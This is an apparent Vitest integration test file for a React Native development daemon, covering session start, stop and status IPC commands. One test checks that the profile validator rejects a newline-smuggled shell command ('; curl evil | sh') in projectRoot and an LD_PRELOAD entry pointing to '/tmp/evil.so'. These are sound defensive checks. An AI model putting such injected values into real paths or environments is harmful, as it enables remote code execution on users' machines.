import { afterEach, describe, expect, it } from "vitest";
import {
  makeTestWorktree,
  spawnTestDaemon,
  type TestDaemonHandle,
} from "../../../test/helpers/spawnTestDaemon.js";
import type { IpcMessage } from "../../core/ipc.js";

// Phase 13.2 merge gate — integration test #3. Exercises session/start |
// session/stop | session/status | events/subscribe end-to-end against a
// real daemon subprocess. Uses a test-only fake services boot
// (`RN_DEV_DAEMON_BOOT_MODE=fake`) so the test exercises the daemon's
// state machine and event fan-out rather than Metro itself — the session
// supervisor is what's under test here, not Metro.

describe("daemon session boot (integration)", () => {
  const cleanups: Array<() => void> = [];
  const liveHandles: TestDaemonHandle[] = [];

  afterEach(async () => {
    for (const h of liveHandles.splice(0)) {
      await h.stop();
    }
    for (const cleanup of cleanups.splice(0)) {
      cleanup();
    }
  });

  it("starts a session, emits metro status events, reports running status, stops cleanly, daemon survives", async () => {
    const { path: worktree, cleanup } = makeTestWorktree();
    cleanups.push(cleanup);

    const daemon = await spawnTestDaemon(worktree, {
      env: { RN_DEV_DAEMON_BOOT_MODE: "fake" },
    });
    liveHandles.push(daemon);

    // 1. Subscribe to session events BEFORE starting the session so we
    //    don't race the starting/running emissions.
    const events: IpcMessage[] = [];
    const sub = await daemon.client.subscribe(
      {
        type: "command",
        action: "events/subscribe",
        id: "sub-1",
      },
      {
        onEvent: (evt) => {
          events.push(evt);
        },
      },
    );
    expect(sub.initial.type).toBe("response");
    expect((sub.initial.payload as { subscribed: boolean }).subscribed).toBe(
      true,
    );

    try {
      // 2. session/start returns {status: "starting"} immediately; the
      //    boot happens asynchronously and emits events as it progresses.
      const startResp = await daemon.client.send({
        type: "command",
        action: "session/start",
        id: "start-1",
        payload: {
          profile: {
            name: "test",
            isDefault: true,
            worktree: null,
            branch: "main",
            platform: "ios",
            mode: "quick",
            metroPort: 8081,
            devices: {},
            buildVariant: "debug",
            preflight: { checks: [], frequency: "once" },
            onSave: [],
            env: {},
            projectRoot: worktree,
          },
        },
      });
      expect(startResp.type).toBe("response");
      expect((startResp.payload as { status: string }).status).toBe("starting");

      // 3. Wait for metro/status: running event (starting → running
      //    transition is what the client cares about most).
      await waitForEvent(events, (evt) => {
        const payload = evt.payload as
          | { kind?: string; data?: { status?: string } }
          | undefined;
        return (
          payload?.kind === "metro/status" && payload.data?.status === "running"
        );
      }, 3_000);

      // Should have seen starting at some point before (possibly in the
      // same batch).
      const startingSeen = events.some((evt) => {
        const payload = evt.payload as
          | { kind?: string; data?: { status?: string } }
          | undefined;
        return (
          payload?.kind === "metro/status" &&
          payload.data?.status === "starting"
        );
      });
      expect(startingSeen).toBe(true);

      // 4. session/status should report running.
      const statusResp = await daemon.client.send({
        type: "command",
        action: "session/status",
        id: "status-1",
      });
      const statusPayload = statusResp.payload as {
        status: string;
        services: Record<string, unknown>;
      };
      expect(statusPayload.status).toBe("running");
      expect(typeof statusPayload.services).toBe("object");

      // 5. session/stop → should emit metro/status: stopped event and
      //    transition back to stopped.
      const stopResp = await daemon.client.send({
        type: "command",
        action: "session/stop",
        id: "stop-1",
      });
      expect(stopResp.type).toBe("response");

      await waitForEvent(events, (evt) => {
        const payload = evt.payload as
          | { kind?: string; data?: { status?: string } }
          | undefined;
        return (
          payload?.kind === "metro/status" && payload.data?.status === "stopped"
        );
      }, 3_000);

      // 6. Daemon must survive session/stop — daemon/ping still answers.
      const pingResp = await daemon.client.send({
        type: "command",
        action: "daemon/ping",
        id: "ping-after-stop",
      });
      expect(pingResp.type).toBe("response");
    } finally {
      sub.close();
    }
  }, 20_000);

  it("start → stop → start succeeds on the same daemon", async () => {
    const { path: worktree, cleanup } = makeTestWorktree();
    cleanups.push(cleanup);

    const daemon = await spawnTestDaemon(worktree, {
      env: { RN_DEV_DAEMON_BOOT_MODE: "fake" },
    });
    liveHandles.push(daemon);

    const profile = {
      name: "test",
      isDefault: true,
      worktree: null,
      branch: "main",
      platform: "ios",
      mode: "quick",
      metroPort: 8081,
      devices: {},
      buildVariant: "debug",
      preflight: { checks: [], frequency: "once" },
      onSave: [],
      env: {},
      projectRoot: worktree,
    };

    // First cycle.
    const start1 = await daemon.client.send({
      type: "command",
      action: "session/start",
      id: "s1",
      payload: { profile },
    });
    expect((start1.payload as { status: string }).status).toBe("starting");
    await waitForStatus(daemon, "running", 3_000);
    await daemon.client.send({
      type: "command",
      action: "session/stop",
      id: "x1",
    });
    await waitForStatus(daemon, "stopped", 3_000);

    // Second cycle on the same daemon — exercises IPC-handler
    // re-registration, epoch reset, module registry re-creation.
    const start2 = await daemon.client.send({
      type: "command",
      action: "session/start",
      id: "s2",
      payload: { profile },
    });
    expect((start2.payload as { status: string }).status).toBe("starting");
    await waitForStatus(daemon, "running", 3_000);
    await daemon.client.send({
      type: "command",
      action: "session/stop",
      id: "x2",
    });
    await waitForStatus(daemon, "stopped", 3_000);
  }, 20_000);

  it("rejects profile payloads that would allow shell injection or env-var pre-loading", async () => {
    const { path: worktree, cleanup } = makeTestWorktree();
    cleanups.push(cleanup);

    const daemon = await spawnTestDaemon(worktree, {
      env: { RN_DEV_DAEMON_BOOT_MODE: "fake" },
    });
    liveHandles.push(daemon);

    const baseProfile = {
      name: "test",
      isDefault: true,
      worktree: null,
      branch: "main",
      platform: "ios",
      mode: "quick",
      metroPort: 8081,
      devices: {},
      buildVariant: "debug",
      preflight: { checks: [], frequency: "once" },
      onSave: [],
      env: {},
      projectRoot: worktree,
    };

    // Shell-injection attempt via profile.projectRoot: newline-laden
    // path that would have broken the watchman `sh -c` argument before
    // argv-form + validation.
    const shellInject = await daemon.client.send({
      type: "command",
      action: "session/start",
      id: "inj-1",
      payload: {
        profile: { ...baseProfile, projectRoot: "/tmp/x\n; curl evil | sh" },
      },
    });
    expect(
      (shellInject.payload as { code?: string }).code,
    ).toBe("E_PROFILE_PATH_NEWLINE");

    // profile.env denylist — LD_PRELOAD must be rejected before any
    // subprocess gets it on their environ.
    const ldPreload = await daemon.client.send({
      type: "command",
      action: "session/start",
      id: "inj-2",
      payload: {
        profile: { ...baseProfile, env: { LD_PRELOAD: "/tmp/evil.so" } },
      },
    });
    expect((ldPreload.payload as { code?: string }).code).toBe(
      "E_PROFILE_ENV_BANNED",
    );

    // Invalid port.
    const badPort = await daemon.client.send({
      type: "command",
      action: "session/start",
      id: "inj-3",
      payload: { profile: { ...baseProfile, metroPort: 70000 } },
    });
    expect((badPort.payload as { code?: string }).code).toBe(
      "E_PROFILE_METRO_PORT",
    );

    // After all three rejections, the daemon is still healthy —
    // a malformed session/start must not wedge the RPC dispatch.
    const ping = await daemon.client.send({
      type: "command",
      action: "daemon/ping",
      id: "ping-after-inj",
    });
    expect(ping.type).toBe("response");
  }, 15_000);

  it("rejects session/start when a session is already running", async () => {
    const { path: worktree, cleanup } = makeTestWorktree();
    cleanups.push(cleanup);

    const daemon = await spawnTestDaemon(worktree, {
      env: { RN_DEV_DAEMON_BOOT_MODE: "fake" },
    });
    liveHandles.push(daemon);

    const minimalProfile = {
      name: "test",
      isDefault: true,
      worktree: null,
      branch: "main",
      platform: "ios",
      mode: "quick",
      metroPort: 8081,
      devices: {},
      buildVariant: "debug",
      preflight: { checks: [], frequency: "once" },
      onSave: [],
      env: {},
      projectRoot: worktree,
    };

    // First start succeeds.
    const first = await daemon.client.send({
      type: "command",
      action: "session/start",
      id: "start-a",
      payload: { profile: minimalProfile },
    });
    expect((first.payload as { status: string }).status).toBe("starting");

    // Wait for running by polling status (no event subscription here).
    await waitForStatus(daemon, "running", 3_000);

    // Second start while running returns an error envelope.
    const second = await daemon.client.send({
      type: "command",
      action: "session/start",
      id: "start-b",
      payload: { profile: minimalProfile },
    });
    const errPayload = second.payload as { code?: string };
    expect(errPayload.code).toBe("E_SESSION_ALREADY_RUNNING");
  }, 15_000);
});

async function waitForEvent(
  events: IpcMessage[],
  pred: (evt: IpcMessage) => boolean,
  timeoutMs: number,
): Promise<IpcMessage> {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    const found = events.find(pred);
    if (found) return found;
    await new Promise((r) => setTimeout(r, 25));
  }
  throw new Error(
    `waitForEvent: timed out after ${timeoutMs}ms. Events seen: ${JSON.stringify(
      events.map((e) => e.payload),
    )}`,
  );
}

async function waitForStatus(
  daemon: TestDaemonHandle,
  target: string,
  timeoutMs: number,
): Promise<void> {
  const deadline = Date.now() + timeoutMs;
  let lastSeen = "(none)";
  while (Date.now() < deadline) {
    const resp = await daemon.client.send({
      type: "command",
      action: "session/status",
      id: `status-poll-${Date.now()}`,
    });
    const payload = resp.payload as { status?: string };
    lastSeen = payload.status ?? "(no status)";
    if (lastSeen === target) return;
    await new Promise((r) => setTimeout(r, 50));
  }
  throw new Error(
    `waitForStatus: timed out waiting for "${target}", last seen "${lastSeen}"`,
  );
}
